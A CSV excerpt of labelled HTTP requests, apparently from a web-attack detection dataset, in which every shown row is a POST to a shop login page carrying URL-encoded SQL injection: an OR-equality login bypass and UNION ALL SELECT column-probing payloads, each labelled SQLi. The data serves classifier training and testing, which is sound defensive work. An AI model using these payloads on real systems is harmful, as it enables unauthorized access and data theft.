,id,method,path,query,label
5399,5399,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20UNION%20ALL%20SELECT%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%2C%20188%23&modo=entrar,SQLi
5400,5400,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20UNION%20ALL%20SELECT%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%2C%202061%23&modo=entrar,SQLi
5401,5401,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20UNION%20ALL%20SELECT%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%2C%205104%23&modo=entrar,SQLi
5402,5402,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20UNION%20ALL%20SELECT%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%2C%20643%23&modo=entrar,SQLi
5403,5403,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20UNION%20ALL%20SELECT%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%2C%20334%23&modo=entrar,SQLi
5404,5404,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%2C%207643%23%20AND%20%28%27rcfg%27%3D%27rcfg&modo=entrar,SQLi
5405,5405,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%2C%202058%23%20AND%20%28%27ONZm%27%3D%27ONZm&modo=entrar,SQLi
5406,5406,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%2C%209772%23%20AND%20%28%27oeCe%27%3D%27oeCe&modo=entrar,SQLi
5407,5407,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%2C%203016%23%20AND%20%28%27aSJG%27%3D%27aSJG&modo=entrar,SQLi
5408,5408,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%2C%202675%23%20AND%20%28%27MOfQ%27%3D%27MOfQ&modo=entrar,SQLi
5409,5409,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%2C%20111%23%20AND%20%28%27eqtc%27%3D%27eqtc&modo=entrar,SQLi
5410,5410,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%2C%201565%23%20AND%20%28%27TgIa%27%3D%27TgIa&modo=entrar,SQLi
5411,5411,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%2C%202229%23%20AND%20%28%27yqkz%27%3D%27yqkz&modo=entrar,SQLi
5412,5412,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%23%20AND%20%28%27qBgU%27%3D%27qBgU&modo=entrar,SQLi
5413,5413,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20UNION%20ALL%20SELECT%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%2C%202136%23%20AND%20%28%27VsgL%27%3D%27VsgL&modo=entrar,SQLi
5414,5414,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%2C%207528%23%20AND%20%28%28%27WmLa%27%3D%27WmLa&modo=entrar,SQLi
5415,5415,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%23%20AND%20%28%28%27jBvu%27%3D%27jBvu&modo=entrar,SQLi
5416,5416,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%2C%207049%23%20AND%20%28%28%27uYOW%27%3D%27uYOW&modo=entrar,SQLi
5417,5417,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%2C%209490%23%20AND%20%28%28%27jxrS%27%3D%27jxrS&modo=entrar,SQLi
5418,5418,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%2C%209937%23%20AND%20%28%28%27gGtZ%27%3D%27gGtZ&modo=entrar,SQLi
5419,5419,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%2C%209469%23%20AND%20%28%28%27wmqU%27%3D%27wmqU&modo=entrar,SQLi
5420,5420,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%2C%201696%23%20AND%20%28%28%27qHKx%27%3D%27qHKx&modo=entrar,SQLi
5421,5421,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%2C%206813%23%20AND%20%28%28%27zBAN%27%3D%27zBAN&modo=entrar,SQLi
5422,5422,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%2C%204548%23%20AND%20%28%28%27utjD%27%3D%27utjD&modo=entrar,SQLi
5423,5423,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20UNION%20ALL%20SELECT%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%2C%206759%23%20AND%20%28%28%27zRle%27%3D%27zRle&modo=entrar,SQLi
5424,5424,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%2C%208673%23%20AND%20%28%28%28%27EJKr%27%3D%27EJKr&modo=entrar,SQLi
5425,5425,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%2C%20787%23%20AND%20%28%28%28%27SNUC%27%3D%27SNUC&modo=entrar,SQLi
5426,5426,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%2C%202092%23%20AND%20%28%28%28%27kRJA%27%3D%27kRJA&modo=entrar,SQLi
5427,5427,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%2C%201103%23%20AND%20%28%28%28%27NGfd%27%3D%27NGfd&modo=entrar,SQLi
5428,5428,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%2C%203895%23%20AND%20%28%28%28%27SZOG%27%3D%27SZOG&modo=entrar,SQLi
5429,5429,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%2C%202802%23%20AND%20%28%28%28%27Qqwg%27%3D%27Qqwg&modo=entrar,SQLi
5430,5430,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%2C%205464%23%20AND%20%28%28%28%27AHmx%27%3D%27AHmx&modo=entrar,SQLi
5431,5431,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%2C%208466%23%20AND%20%28%28%28%27OnOr%27%3D%27OnOr&modo=entrar,SQLi
5432,5432,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%2C%209900%23%20AND%20%28%28%28%27JTSu%27%3D%27JTSu&modo=entrar,SQLi
5433,5433,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20UNION%20ALL%20SELECT%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%2C%205886%23%20AND%20%28%28%28%27jlmo%27%3D%27jlmo&modo=entrar,SQLi
